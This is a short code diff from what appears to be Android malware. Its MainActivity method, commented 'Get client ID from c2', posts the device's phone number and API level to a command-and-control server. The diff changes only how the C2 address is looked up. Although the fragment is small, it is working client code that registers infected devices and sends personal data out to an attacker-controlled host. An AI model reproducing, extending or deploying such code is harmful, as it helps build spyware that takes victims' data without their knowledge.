@@ -141,7 +141,7 @@ public class MainActivity extends AppCompatActivity {
      * Get client ID from c2
      */
     private void setClientID() throws JSONException {
-        String url = Utils.C2_SERVER + "/client";
+        String url = Utils.getC2Address() + "/client";
 
         String formData = "phone=" + Utils.phoneNumber(getApplicationContext());
         formData += "&device_api=" + Utils.deviceAPI();
